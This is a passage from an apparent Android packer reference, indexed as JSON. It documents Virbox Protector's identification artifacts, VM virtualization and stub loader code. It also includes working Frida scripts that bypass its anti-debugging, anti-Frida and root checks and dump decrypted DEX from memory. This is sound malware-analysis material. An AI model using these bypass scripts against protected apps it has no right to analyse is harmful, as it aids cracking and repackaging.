<li>Verimatrix Code Protection</li> <li>Verimatrix Whitebox Cryptography</li> <li>Guardsquare Acquires Verimatrix XTD</li> <li>APKiD -- Android Application Identifier</li> <li>APKiD Issue #397 -- InsideSecure/zShield False Positive</li> <li>Verimatrix GitHub Actions Integration</li> <li>Inside Secure Whitebox 3.0 Documentation</li> <li>EMVCo Security Evaluation</li> </ul>"},{"location":"packers/virbox/","title":"Virbox Protector","text":"<p>Virbox Protector is a commercial application shielding solution developed by SenseShield Technology, a Chinese software protection company. While designed for legitimate developers to protect their applications from reverse engineering, Virbox has been observed in sophisticated Android malware campaigns.</p>"},{"location":"packers/virbox/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer SenseShield Technology Origin China Type Commercial Packer/Protector Platforms Android, Windows, Linux, macOS, ARM-Linux Min Android Android 4.0+ (API 14) Architectures ARM V7/V8, x86, x64 Website appsec.virbox.com"},{"location":"packers/virbox/#identification","title":"Identification","text":""},{"location":"packers/virbox/#file-artifacts","title":"File Artifacts","text":"Artifact Description Stub Package Hex-based package name Stub Class Stub app class Extending Application Native Library <code>libvirbox_*.so</code> in assets or lib folder Tag String <code>\"virbox\"</code> string reference"},{"location":"packers/virbox/#native-library-naming-convention","title":"Native Library Naming Convention","text":"<pre><code>libvirbox_a32.so   // ARM 32-bit\nlibvirbox_a64.so   // ARM 64-bit\nlibvirbox_x86.so   // x86\nlibvirbox_x64.so   // x86_64\nlibvirbox_mips.so  // MIPS\nlibvirbox_m64.so   // MIPS64\n</code></pre>"},{"location":"packers/virbox/#native-method-signatures","title":"Native Method Signatures","text":"<p>Obfuscated JNI methods follow this pattern:</p> <pre><code>native void I6f7de22b_00(Context context);\nnative void I6f7de22b_01(Context context, Application app, String className);\nnative void I6f7de22b_02(Activity activity, Bundle bundle);\nnative void I6f7de22b_03(Activity activity);\nnative void I6f7de22b_04(Activity activity);\nnative void I6f7de22b_05(Network network, NetworkCapabilities caps);\nnative boolean I6f7de22b_06();\n</code></pre>"},{"location":"packers/virbox/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/virbox/#dex-protection","title":"DEX Protection","text":""},{"location":"packers/virbox/#dex-encryption","title":"DEX Encryption","text":"<p>Encrypts the entire classes.dex file. Decryption occurs at runtime via native code. Not recommended for Google Play apps as it may fail store checks.</p>"},{"location":"packers/virbox/#dex-virtualization","title":"DEX Virtualization","text":"<p>Converts Dalvik bytecode into proprietary VM instructions:</p> <ol> <li>Original method bytecode is extracted</li> <li>Bytecode is transformed into custom instruction set</li> <li>Custom VM interpreter executes in native layer</li> <li>Original method becomes a stub calling native VM</li> </ol> <p>This defeats static analysis as the bytecode no longer exists in standard Dalvik format.</p>"},{"location":"packers/virbox/#string-encryption","title":"String Encryption","text":"<p>Sensitive strings are encrypted and decrypted at runtime via SDK labels.</p>"},{"location":"packers/virbox/#native-library-protection","title":"Native Library Protection","text":"<ul> <li>Code Section Encryption: Encrypts .text section of .so files</li> <li>Symbol Table Stripping: Removes function names and exports</li> <li>Import/Export Hiding: Obscures dynamic linking information</li> <li>Function Virtualization: Critical functions converted to VM code</li> </ul>"},{"location":"packers/virbox/#runtime-protection-rasp","title":"Runtime Protection (RASP)","text":""},{"location":"packers/virbox/#anti-debugging","title":"Anti-Debugging","text":"<p>Detects debuggers using multiple techniques:</p> <ul> <li>Checks for TracerPid in <code>/proc/self/status</code></li> <li>Detects ptrace attachment</li> <li>Monitors for IDA Pro, gdb, jeb, lldb</li> <li>App exits immediately upon detection</li> </ul>"},{"location":"packers/virbox/#anti-injection","title":"Anti-Injection","text":"<ul> <li>Dual-session ptrace to block external attachment</li> <li>Detects .so injection attempts</li> <li>Monitors for Frida, Xposed hooks</li> </ul>"},{"location":"packers/virbox/#emulator-detection","title":"Emulator Detection","text":"<p>Identifies emulator environments via:</p> <ul> <li>Build properties (ro.product.model, ro.hardware)</li> <li>File system artifacts</li> <li>Hardware characteristics</li> <li>App terminates if emulator detected</li> </ul>"},{"location":"packers/virbox/#root-detection","title":"Root Detection","text":"<p>Checks for:</p> <ul> <li>su binary presence</li> <li>Root management apps</li> <li>Modified system partitions</li> </ul>"},{"location":"packers/virbox/#multi-parallel-detection","title":"Multi-Parallel Detection","text":"<p>Prevents app cloning and multi-account environments.</p>"},{"location":"packers/virbox/#signature-verification","title":"Signature Verification","text":"<p>Validates APK signature against expected developer certificate to prevent repackaging.</p>"},{"location":"packers/virbox/#file-integrity-check","title":"File Integrity Check","text":"<p>Hash verification of APK contents to detect tampering.</p>"},{"location":"packers/virbox/#vm-architecture","title":"VM Architecture","text":"<p>Virbox's DEX virtualization replaces Dalvik bytecode with a proprietary instruction set executed by an embedded native interpreter. This is not obfuscation or encryption -- the original bytecode is destroyed and replaced with an entirely different representation that only the Virbox VM can execute.</p>"},{"location":"packers/virbox/#custom-instruction-set","title":"Custom Instruction Set","text":"<p>The Virbox VM uses a proprietary opcode table that has no relationship to the Dalvik instruction set. Each Virbox opcode maps to one or more Dalvik operations, but the encoding, operand layout, and instruction widths are all different. The opcode table is randomized per build, so two APKs protected by Virbox will have different opcode assignments even if they contain identical source code. This per-build randomization defeats pattern-based analysis -- you cannot build a universal Virbox disassembler from a single sample.</p> <p>Key properties of the instruction set:</p> <ul> <li>Variable-width instructions (not aligned to Dalvik's 16-bit unit boundaries)</li> <li>Opcodes are assigned from a shuffled table generated at protection time</li> <li>Operand encoding differs from Dalvik's register/immediate format</li> <li>String, type, and method references use an indirection table rather than direct DEX pool indices</li> </ul>"},{"location":"packers/virbox/#dispatch-loop-structure","title":"Dispatch Loop Structure","text":"<p>The VM interpreter in <code>libvirbox_*.so</code> uses a threaded dispatch model rather than a simple switch-case loop. In a switch dispatch interpreter, a central loop reads an opcode, branches through a switch statement, executes the handler, and loops back. Threaded dispatch eliminates the central loop: each opcode handler ends with a direct jump to the next handler, computed from the next opcode in the bytecode stream.</p> <pre><code>void vm_entry(VMContext *ctx) {\n    ctx-&gt;pc = ctx-&gt;bytecode_start;\n    ctx-&gt;handler_table[*ctx-&gt;pc](ctx);\n}\n\nvoid op_handler_0x3A(VMContext *ctx) {\n    uint16_t reg_dst = ctx-&gt;pc[1];\n    uint16_t reg_src = ctx-&gt;pc[2];\n    ctx-&gt;registers[reg_dst] = ctx-&gt;registers[reg_src] + 1;\n    ctx-&gt;pc += 3;\n    ctx-&gt;handler_table[*ctx-&gt;pc](ctx);\n}\n</code></pre> <p>This structure makes static analysis harder because IDA and Ghidra cannot resolve the indirect jump targets without knowing the handler table layout. The control flow graph of the interpreter appears as a set of disconnected basic blocks rather than a recognizable loop.</p>"},{"location":"packers/virbox/#vm-boundary-crossings","title":"VM Boundary Crossings","text":"<p>Not every method in a protected APK is virtualized. Virbox allows developers to select which classes and methods to virtualize. This creates a boundary between virtualized code (executing inside the Virbox VM) and non-virtualized code (running as normal Dalvik bytecode in ART).</p> <p>Virtualized calling non-virtualized: When VM code needs to invoke a standard Java method, the VM interpreter uses JNI to call back into the Dalvik/ART runtime. The VM marshals arguments from its internal register file into JNI call parameters, invokes <code>CallObjectMethod</code>/<code>CallVoidMethod</code>/etc., and stores the return value back into VM registers.</p> <p>Non-virtualized calling virtualized: The original Java method is replaced with a native stub. When ART dispatches the method call, it hits the JNI stub, which enters the VM interpreter with the method's virtualized bytecode. Arguments are transferred from ART's register frame into the VM's register file.</p> <p>These boundary crossings are observable through JNI hooking and represent one of the few points where you can intercept data flowing through virtualized code.</p>"},{"location":"packers/virbox/#register-mapping","title":"Register Mapping","text":"<p>The Virbox VM maintains its own register file, separate from ART's virtual registers. The VM register count is not constrained by Dalvik's 16-register addressing limit for most instructions. During boundary crossings, a marshaling layer maps between ART registers (v0, v1, ...) and VM registers (r0, r1, ...). The mapping is not one-to-one -- the VM may use more registers than the original Dalvik method due to instruction set differences.</p>"},{"location":"packers/virbox/#why-static-analysis-tools-fail","title":"Why Static Analysis Tools Fail","text":"<p>IDA Pro and Ghidra can disassemble the <code>libvirbox_*.so</code> binary and identify the VM interpreter functions. However, they cannot make sense of the virtualized bytecode because:</p> <ol> <li>The bytecode is data, not native code -- disassemblers will not attempt to decode it</li> <li>The opcode-to-handler mapping is only resolvable at runtime (stored in a table initialized during VM startup)</li> <li>The per-build opcode randomization means no fixed processor module can decode all samples</li> <li>Building a custom IDA processor module requires extracting the opcode table from each individual sample</li> </ol> <p>A custom Ghidra or IDA processor module is theoretically possible per-sample, but extracting the opcode table requires either dynamic analysis of the interpreter initialization or significant manual reverse engineering of the table construction code in <code>libvirbox_*.so</code>.</p>"},{"location":"packers/virbox/#technical-analysis","title":"Technical Analysis","text":""},{"location":"packers/virbox/#stub-application-structure","title":"Stub Application Structure","text":"<pre><code>package v6f7de22b;\n\nclass app extends Application {\n\n    static String TAG = \"virbox\";\n    static Context appContext;\n\n    String nativeLibPath;\n    String realAppClassName;\n    String newResDir;\n    boolean initialized = false;\n    Application realApplication;\n    Object savedProviders;\n\n    native void I6f7de22b_00(Context context);\n    native void I6f7de22b_01(Context context, Application app, String className);\n    native void I6f7de22b_02(Activity activity, Bundle bundle);\n    native void I6f7de22b_03(Activity activity);\n    native void I6f7de22b_04(Activity activity);\n    native void I6f7de22b_05(Network network, NetworkCapabilities caps);\n    native boolean I6f7de22b_06();\n}\n</code></pre>"},{"location":"packers/virbox/#architecture-detection","title":"Architecture Detection","text":"<pre><code>String getLibrarySuffix(String abi, boolean is64bit) {\n    if (!is64bit) {\n        if (abi.contains(\"armeabi\")) return \"_a32.so\";\n        if (abi.contains(\"arm64\"))   return \"_a64.so\";\n        if (abi.contains(\"x86_64\"))  return \"_x64.so\";\n        if (abi.contains(\"x86\"))     return \"_x86.so\";\n        if (abi.contains(\"mips64\"))  return \"_m64.so\";\n        if (abi.contains(\"mips\"))    return \"_mips.so\";\n    } else {\n        if (abi.contains(\"armeabi\")) return \"_x86.so\";\n        if (abi.contains(\"arm64\") || abi.contains(\"x86_64\")) return \"_x64.so\";\n        if (abi.contains(\"x86\"))     return \"_x86.so\";\n        if (abi.contains(\"mips64\"))  return \"_m64.so\";\n        if (abi.contains(\"mips\"))    return \"_mips.so\";\n    }\n    return \"\";\n}\n</code></pre>"},{"location":"packers/virbox/#native-library-extraction","title":"Native Library Extraction","text":"<pre><code>boolean extractAsset(Context ctx, String assetName, String destDir, String destName) {\n    String destPath = destDir + \"/\" + destName;\n    File dir = new File(destDir);\n    if (!dir.exists()) dir.mkdirs();\n\n    File destFile = new File(destPath);\n    InputStream assetStream = ctx.getAssets().open(assetName);\n\n    if (destFile.exists() &amp;&amp; filesAreEqual(assetStream, new FileInputStream(destFile))) {\n        assetStream.close();\n        return true;\n    }\n\n    destFile.delete();\n    assetStream.close();\n\n    assetStream = ctx.getAssets().open(assetName);\n    FileOutputStream fos = new FileOutputStream(destPath);\n\n    byte[] buffer = new byte[1024];\n    int bytesRead;\n    while ((bytesRead = assetStream.read(buffer)) != -1) {\n        fos.write(buffer, 0, bytesRead);\n    }\n\n    assetStream.close();\n    fos.close();\n\n    destFile.setReadable(true, false);\n    destFile.setExecutable(true, false);\n    destFile.setWritable(false, false);\n\n    return true;\n}\n</code></pre>"},{"location":"packers/virbox/#initialization-attachbasecontext","title":"Initialization (attachBaseContext)","text":"<pre><code>void attachBaseContext(Context base) {\n    super.attachBaseContext(base);\n    appContext = base;\n\n    String abi = Build.CPU_ABI;\n    String libSuffix = getLibrarySuffix(abi, false);\n    String libName = \"libvirbox\" + libSuffix;\n\n    String nativeDir = getApplicationInfo().nativeLibraryDir;\n    String dataDir = getFilesDir().getAbsolutePath();\n\n    if (assetExists(base, libName)) {\n        extractAsset(base, libName, dataDir, libName);\n        this.nativeLibPath = dataDir + \"/\" + libName;\n    } else {\n        this.nativeLibPath = nativeDir + \"/\" + libName;\n    }\n\n    System.load(this.nativeLibPath);\n\n    I6f7de22b_00(base);\n\n    saveProviders();\n\n    this.realAppClassName = getRealApplicationClassName();\n\n    if (this.realAppClassName != null) {\n        Class realAppClass = Class.forName(this.realAppClassName);\n        this.realApplication = (Application) realAppClass.newInstance();\n\n        Method attachMethod = Application.class.getDeclaredMethod(\"attach\", Context.class);\n        attachMethod.setAccessible(true);\n        attachMethod.invoke(this.realApplication, base);\n    }\n\n    I6f7de22b_01(base, this.realApplication, this.realAppClassName);\n\n    registerActivityLifecycleCallbacks(new ActivityLifecycleHandler());\n\n    ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);\n    cm.registerDefaultNetworkCallback(new NetworkHandler());\n}\n</code></pre>"},{"location":"packers/virbox/#contentprovider-manipulation","title":"ContentProvider Manipulation","text":"<p>Virbox delays ContentProvider initialization to ensure proper unpacking order:</p> <pre><code>void saveProviders() {\n    Class activityThreadClass = Class.forName(\"android.app.ActivityThread\");\n    Method currentMethod = activityThreadClass.getMethod(\"currentActivityThread\");\n    Object activityThread = currentMethod.invoke(null);\n\n    Object boundApp = getField(activityThread, \"mBoundApplication\").get(activityThread);\n    Field providersField = getField(boundApp, \"providers\");\n\n    this.savedProviders = providersField.get(boundApp);\n    providersField.set(boundApp, null);\n}\n\nvoid restoreProviders() {\n    Class activityThreadClass = Class.forName(\"android.app.ActivityThread\");\n    Method currentMethod = activityThreadClass.getMethod(\"currentActivityThread\");\n    Object activityThread = currentMethod.invoke(null);\n\n    Object boundApp = getField(activityThread, \"mBoundApplication\").get(activityThread);\n    getField(boundApp, \"providers\").set(boundApp, this.savedProviders);\n\n    if (this.savedProviders != null) {\n        Method installProviders = activityThreadClass.getDeclaredMethod(\n            \"installContentProviders\", Context.class, List.class);\n        installProviders.setAccessible(true);\n        installProviders.invoke(activityThread, this.realApplication, this.savedProviders);\n        this.savedProviders = null;\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#application-replacement","title":"Application Replacement","text":"<p>Replaces stub Application with real Application in Android internals:</p> <pre><code>void replaceApplication() {\n    Class activityThreadClass = Class.forName(\"android.app.ActivityThread\");\n    Method currentMethod = activityThreadClass.getMethod(\"currentActivityThread\");\n    Object activityThread = currentMethod.invoke(null);\n\n    Field initialAppField = activityThreadClass.getDeclaredField(\"mInitialApplication\");\n    initialAppField.setAccessible(true);\n    if (initialAppField.get(activityThread) == this) {\n        initialAppField.set(activityThread, this.realApplication);\n    }\n\n    Field allAppsField = activityThreadClass.getDeclaredField(\"mAllApplications\");\n    allAppsField.setAccessible(true);\n    List allApps = (List) allAppsField.get(activityThread);\n    for (int i = 0; i &lt; allApps.size(); i++) {\n        if (allApps.get(i) == this) {\n            allApps.set(i, this.realApplication);\n        }\n    }\n\n    Class loadedApkClass;\n    try {\n        loadedApkClass = Class.forName(\"android.app.LoadedApk\");\n    } catch (ClassNotFoundException e) {\n        loadedApkClass = Class.forName(\"android.app.ActivityThread$PackageInfo\");\n    }\n\n    Field appField = loadedApkClass.getDeclaredField(\"mApplication\");\n    appField.setAccessible(true);\n\n    Field resDirField = loadedApkClass.getDeclaredField(\"mResDir\");\n    resDirField.setAccessible(true);\n\n    Field loadedApkField = null;\n    try {\n        loadedApkField = Application.class.getDeclaredField(\"mLoadedApk\");\n    } catch (NoSuchFieldException e) {}\n\n    String[] packageFields = {\"mPackages\", \"mResourcePackages\"};\n\n    for (String fieldName : packageFields) {\n        Field packagesField = activityThreadClass.getDeclaredField(fieldName);\n        packagesField.setAccessible(true);\n        Map packages = (Map) packagesField.get(activityThread);\n\n        for (Object entry : packages.entrySet()) {\n            Object weakRef = ((Map.Entry) entry).getValue();\n            Object loadedApk = ((WeakReference) weakRef).get();\n\n            if (loadedApk != null &amp;&amp; appField.get(loadedApk) == this) {\n                appField.set(loadedApk, this.realApplication);\n\n                if (this.newResDir != null) {\n                    resDirField.set(loadedApk, this.newResDir);\n                }\n\n                if (loadedApkField != null) {\n                    loadedApkField.set(this.realApplication, loadedApk);\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#resource-replacement","title":"Resource Replacement","text":"<pre><code>void replaceResources() {\n    if (this.newResDir == null) return;\n\n    AssetManager newAssets = AssetManager.class.getConstructor().newInstance();\n    Method addPath = AssetManager.class.getDeclaredMethod(\"addAssetPath\", String.class);\n    addPath.setAccessible(true);\n\n    int result = (Integer) addPath.invoke(newAssets, this.newResDir);\n    if (result == 0) {\n        throw new IllegalStateException(\"Could not create new AssetManager\");\n    }\n\n    if (Build.VERSION.SDK_INT &lt;= 19) {\n        Method ensureBlocks = AssetManager.class.getDeclaredMethod(\"ensureStringBlocks\");\n        ensureBlocks.setAccessible(true);\n        ensureBlocks.invoke(newAssets);\n    }\n\n    Class resourcesManagerClass = Class.forName(\"android.app.ResourcesManager\");\n    Method getInstance = resourcesManagerClass.getDeclaredMethod(\"getInstance\");\n    Object resourcesManager = getInstance.invoke(null);\n\n    Collection resourcesList;\n    try {\n        Field activeField = resourcesManagerClass.getDeclaredField(\"mActiveResources\");\n        activeField.setAccessible(true);\n        resourcesList = ((ArrayMap) activeField.get(resourcesManager)).values();\n    } catch (NoSuchFieldException e) {\n        Field refsField = resourcesManagerClass.getDeclaredField(\"mResourceReferences\");\n        refsField.setAccessible(true);\n        resourcesList = (Collection) refsField.get(resourcesManager);\n    }\n\n    for (Object ref : resourcesList) {\n        Resources res = (Resources) ((WeakReference) ref).get();\n\n        try {\n            Field assetsField = Resources.class.getDeclaredField(\"mAssets\");\n            assetsField.setAccessible(true);\n            assetsField.set(res, newAssets);\n        } catch (NoSuchFieldException e) {\n            Field implField = Resources.class.getDeclaredField(\"mResourcesImpl\");\n            implField.setAccessible(true);\n            Object impl = implField.get(res);\n\n            Field implAssetsField = impl.getClass().getDeclaredField(\"mAssets\");\n            implAssetsField.setAccessible(true);\n            implAssetsField.set(impl, newAssets);\n        }\n\n        res.updateConfiguration(res.getConfiguration(), res.getDisplayMetrics());\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#oncreate-execution","title":"onCreate Execution","text":"<pre><code>void onCreate() {\n    if (this.realApplication != null) {\n        replaceApplication();\n        replaceResources();\n        restoreProviders();\n    }\n\n    super.onCreate();\n\n    if (this.realApplication != null) {\n        this.realApplication.onCreate();\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#activity-lifecycle-monitoring","title":"Activity Lifecycle Monitoring","text":"<pre><code>class ActivityLifecycleHandler implements ActivityLifecycleCallbacks {\n    Handler handler = new Handler();\n    Runnable hijackDetector;\n\n    void cancelHijackCheck() {\n        if (hijackDetector != null) {\n            handler.removeCallbacks(hijackDetector);\n            hijackDetector = null;\n        }\n    }\n\n    void scheduleHijackCheck(Activity activity) {\n        if (activity == null || activity.isFinishing() || activity.isDestroyed()) {\n            return;\n        }\n\n        hijackDetector = new Runnable() {\n            WeakReference&lt;Activity&gt; activityRef = new WeakReference&lt;&gt;(activity);\n\n            void run() {\n                Activity act = activityRef.get();\n                if (act != null &amp;&amp; !act.isFinishing() &amp;&amp; !act.isDestroyed()) {\n                    String msg = isChineseLocale()\n                        ? \"\u5e94\u7528\u5df2\u88ab\u5207\u6362\u81f3\u540e\u53f0\"\n                        : \"App has been switched to background\";\n                    Toast.makeText(act, msg, Toast.LENGTH_SHORT).show();\n                }\n            }\n        };\n\n        handler.postDelayed(hijackDetector, 1000);\n    }\n\n    void onActivityCreated(Activity activity, Bundle state) {\n        I6f7de22b_02(activity, state);\n    }\n\n    void onActivityStarted(Activity activity) {\n        I6f7de22b_03(activity);\n    }\n\n    void onActivityResumed(Activity activity) {\n        cancelHijackCheck();\n    }\n\n    void onActivityPaused(Activity activity) {\n        if (I6f7de22b_06()) {\n            scheduleHijackCheck(activity);\n        }\n        I6f7de22b_04(activity);\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#network-monitoring","title":"Network Monitoring","text":"<pre><code>class NetworkHandler extends ConnectivityManager.NetworkCallback {\n    void onCapabilitiesChanged(Network network, NetworkCapabilities caps) {\n        I6f7de22b_05(network, caps);\n    }\n}\n</code></pre>"},{"location":"packers/virbox/#reflection-helper","title":"Reflection Helper","text":"<pre><code>Field getField(Object obj, String fieldName) {\n    Class cls = obj.getClass();\n    while (cls != null) {\n        try {\n            Field field = cls.getDeclaredField(fieldName);\n            field.setAccessible(true);\n            return field;\n        } catch (NoSuchFieldException e) {\n            cls = cls.getSuperclass();\n        }\n    }\n    throw new IllegalStateException(fieldName);\n}\n</code></pre>"},{"location":"packers/virbox/#reflection-targets-summary","title":"Reflection Targets Summary","text":""},{"location":"packers/virbox/#activitythread","title":"ActivityThread","text":"Field Purpose <code>mInitialApplication</code> Primary Application reference <code>mAllApplications</code> List of all Application instances <code>mBoundApplication</code> AppBindData containing providers <code>mPackages</code> Package name to LoadedApk map <code>mResourcePackages</code> Resource package map"},{"location":"packers/virbox/#loadedapk","title":"LoadedApk","text":"Field Purpose <code>mApplication</code> Application instance reference <code>mResDir</code> Resource directory path"},{"location":"packers/virbox/#resourcesmanager","title":"ResourcesManager","text":"Field Purpose <code>mActiveResources</code> Active Resources map (older Android) <code>mResourceReferences</code> Resource references (newer Android)"},{"location":"packers/virbox/#appbinddata","title":"AppBindData","text":"Field Purpose <code>providers</code> List of ContentProvider info"},{"location":"packers/virbox/#unpacking-approaches","title":"Unpacking Approaches","text":"<p>Virbox is the hardest commercial Android packer to unpack. Standard DEX dumping techniques that work against Tencent Legu, Bangcle, or even DexProtector are ineffective here because the core protection is not encryption -- it is virtualization. The original Dalvik bytecode for protected methods does not exist in memory at any point during execution. There is no \"dump window\" for virtualized methods because those methods never return to Dalvik bytecode form. They execute as native VM code inside the interpreter.</p> <p>This fundamentally changes the analyst's approach. Instead of trying to recover the original code, the goal shifts to extracting behavioral information through dynamic observation.</p>"},{"location":"packers/virbox/#frida-dexdump-limitations","title":"frida-dexdump Limitations","text":"<p>Tools like frida-dexdump scan process memory for DEX magic bytes (<code>dex\\n035\\0</code> or <code>dex\\n039\\0</code>) and dump any DEX structures they find. Against Virbox, this will recover:</p> <ul> <li>The stub DEX containing the Virbox loader classes</li> <li>Any non-virtualized DEX code (if the developer only virtualized selected methods)</li> <li>The encrypted original DEX in some configurations (which cannot be used without the decryption key)</li> </ul> <p>It will not recover the virtualized methods. Those methods exist only as proprietary bytecode interpreted by the native VM. frida-dexdump has no way to recognize or extract this data because it is not in DEX format.</p>"},{"location":"packers/virbox/#vm-interpreter-analysis","title":"VM Interpreter Analysis","text":"<p>The most technically demanding approach targets the VM interpreter itself. The goal is to hook the dispatch loop and log opcode execution to reconstruct what the virtualized code does.</p> <pre><code>var libvirbox = Process.findModuleByName(\"libvirbox_a64.so\");\n\nvar exports = libvirbox.enumerateExports();\nvar symbols = libvirbox.enumerateSymbols();\n\nvar vmDispatch = null;\nexports.forEach(function(exp) {\n    if (exp.name.indexOf(\"vm_dispatch\") !== -1 ||\n        exp.name.indexOf(\"interpreter\") !== -1) {\n        vmDispatch = exp.address;\n    }\n});\n\nif (vmDispatch) {\n    Interceptor.attach(vmDispatch, {\n        onEnter: function(args) {\n            console.log(\"[VM] dispatch called from \" +\n                Thread.backtrace(this.context, Backtracer.ACCURATE)\n                    .map(DebugSymbol.fromAddress).join(\"\\n\"));\n        }\n    });\n}\n</code></pre> <p>Since exports are typically stripped, a more practical approach is scanning for the dispatch loop pattern in the <code>.text</code> section:</p> <pre><code>var libvirbox = Process.findModuleByName(\"libvirbox_a64.so\");\nvar baseAddr = libvirbox.base;\nvar size = libvirbox.size;\n\nMemory.scan(baseAddr, size, \"?? ?? ?? ?? 1F 20 03 D5 ?? ?? ?? 94\", {\n    onMatch: function(address, size) {\n        console.log(\"[SCAN] potential dispatch at: \" + address);\n    },\n    onComplete: function() {\n        console.log(\"[SCAN] complete\");\n    }\n});\n</code></pre> <p>This approach requires significant per-sample effort and is rarely worth pursuing unless the objective is understanding the VM itself rather than the protected application.</p>"},{"location":"packers/virbox/#bypassing-rasp","title":"Bypassing RASP","text":"<p>Before any dynamic analysis can begin, the RASP checks must be neutralized. Virbox's RASP will terminate the process via <code>System.exit()</code> or <code>Runtime.exit()</code> when it detects debugging, rooting, emulation, or injection. The most reliable approach is to block all exit paths early in spawn mode.</p>"},{"location":"packers/virbox/#blocking-process-termination","title":"Blocking Process Termination","text":"<pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"[RASP] System.exit(\" + code + \") blocked\");\n        console.log(Java.use(\"android.util.Log\")\n            .getStackTraceString(Java.use(\"java.lang.Exception\").$new()));\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"[RASP] Runtime.exit(\" + code + \") blocked\");\n        console.log(Java.use(\"android.util.Log\")\n            .getStackTraceString(Java.use(\"java.lang.Exception\").$new()));\n    };\n\n    var Process = Java.use(\"android.os.Process\");\n    Process.killProcess.implementation = function(pid) {\n        console.log(\"[RASP] killProcess(\" + pid + \") blocked\");\n    };\n});\n</code></pre>"},{"location":"packers/virbox/#defeating-anti-frida-detection","title":"Defeating Anti-Frida Detection","text":"<p>Virbox scans <code>/proc/self/maps</code> for Frida artifacts and checks for the Frida server port. Use reFrida to avoid common detection signatures, or manually patch the detection:</p> <pre><code>var openPtr = Module.findExportByName(null, \"open\");\nInterceptor.attach(openPtr, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; this.path.indexOf(\"/proc/\") !== -1 &amp;&amp;\n            this.path.indexOf(\"/maps\") !== -1) {\n            this.isMaps = true;\n            this.fd = retval.toInt32();\n        }\n    }\n});\n\nvar readPtr = Module.findExportByName(null, \"read\");\nInterceptor.attach(readPtr, {\n    onLeave: function(retval) {\n        if (this.isMaps) {\n            var buf = this.context.x1;\n            var content = buf.readUtf8String(retval.toInt32());\n            if (content.indexOf(\"frida\") !== -1 || content.indexOf(\"gadget\") !== -1) {\n                var cleaned = content.replace(/.*frida.*/gi, \"\")\n                                     .replace(/.*gadget.*/gi, \"\");\n                buf.writeUtf8String(cleaned);\n            }\n        }\n    }\n});\n</code></pre>"},{"location":"packers/virbox/#tracerpid-bypass","title":"TracerPid Bypass","text":"<pre><code>var fopen = Module.findExportByName(null, \"fopen\");\nInterceptor.attach(fopen, {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.path &amp;&amp; this.path.indexOf(\"/proc/\") !== -1 &amp;&amp;\n            this.path.indexOf(\"/status\") !== -1) {\n            this.statusFile = retval;\n        }\n    }\n});\n\nvar fgets = Module.findExportByName(null, \"fgets\");\nInterceptor.attach(fgets, {\n    onLeave: function(retval) {\n        if (retval &amp;&amp; !retval.isNull()) {\n            var line = retval.readUtf8String();\n            if (line &amp;&amp; line.indexOf(\"TracerPid\") !== -1) {\n                retval.writeUtf8String(\"TracerPid:\\t0\\n\");\n            }\n        }\n    }\n});\n</code></pre>"},{"location":"packers/virbox/#hooking-native-library-loading","title":"Hooking Native Library Loading","text":"<p>Intercepting <code>System.loadLibrary</code> and <code>System.load</code> reveals the order in which Virbox loads its components and helps identify the right moment to attach further hooks:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n\n    System.loadLibrary.implementation = function(name) {\n        console.log(\"[LIB] System.loadLibrary: \" + name);\n        this.loadLibrary(name);\n        if (name.indexOf(\"virbox\") !== -1) {\n            console.log(\"[LIB] Virbox native library loaded, attaching hooks...\");\n            hookVirboxInternals();\n        }\n    };\n\n    System.load.implementation = function(path) {\n        console.log(\"[LIB] System.load: \" + path);\n        this.load(path);\n        if (path.indexOf(\"virbox\") !== -1) {\n            console.log(\"[LIB] Virbox native library loaded from: \" + path);\n            hookVirboxInternals();\n        }\n    };\n});\n\nfunction hookVirboxInternals() {\n    var mod = Process.findModuleByName(\"libvirbox_a64.so\");\n    if (!mod) mod = Process.findModuleByName(\"libvirbox_a32.so\");\n    if (!mod) return;\n\n    console.log(\"[LIB] Module base: \" + mod.base + \" size: \" + mod.size);\n\n    mod.enumerateExports().forEach(function(exp) {\n        console.log(\"[EXPORT] \" + exp.name + \" @ \" + exp.address);\n    });\n}\n</code></pre>"},{"location":"packers/virbox/#memory-analysis","title":"Memory Analysis","text":"<p>For the DEX encryption mode (as opposed to virtualization), there is a window during which decrypted DEX data exists in memory. Scanning <code>/proc/self/maps</code> for anonymous memory regions with the right characteristics can locate decrypted content:</p> <pre><code>function scanForDex() {\n    var maps = File.readAllText(\"/proc/self/maps\");\n    var lines = maps.split(\"\\n\");\n\n    lines.forEach(function(line) {\n        if (line.indexOf(\"rw\") !== -1 &amp;&amp; line.indexOf(\"/\") === -1) {\n            var parts = line.split(\"-\");\n            var start = ptr(\"0x\" + parts[0]);\n            try {\n                var magic = start.readByteArray(4);\n                var header = new Uint8Array(magic);\n                if (header[0] === 0x64 &amp;&amp; header[1] === 0x65 &amp;&amp;\n                    header[2] === 0x78 &amp;&amp; header[3] === 0x0a) {\n                    var fileSize = start.add(32).readU32();\n                    console.log(\"[DEX] Found at \" + start + \" size: \" + fileSize);\n                    var dexData = start.readByteArray(fileSize);\n                    var f = new File(\"/data/local/tmp/dumped_\" +\n                        start.toString().slice(2) + \".dex\", \"wb\");\n                    f.write(dexData);\n                    f.close();\n                    console.log(\"[DEX] Dumped to /data/local/tmp/\");\n                }\n            } catch(e) {}\n        }\n    });\n}\n\nJava.perform(function() {\n    var Activity = Java.use(\"android.app.Activity\");\n    Activity.onResume.implementation = function() {\n        this.onResume();\n        scanForDex();\n    };\n});\n</code></pre> <p>This works for DEX encryption but not for DEX virtualization. For virtualized methods, the bytecode never appears in DEX form in memory.</p>"},{"location":"packers/virbox/#intercepting-network-calls-from-virtualized-code","title":"Intercepting Network Calls from Virtualized Code","text":"<p>Even when code is virtualized, 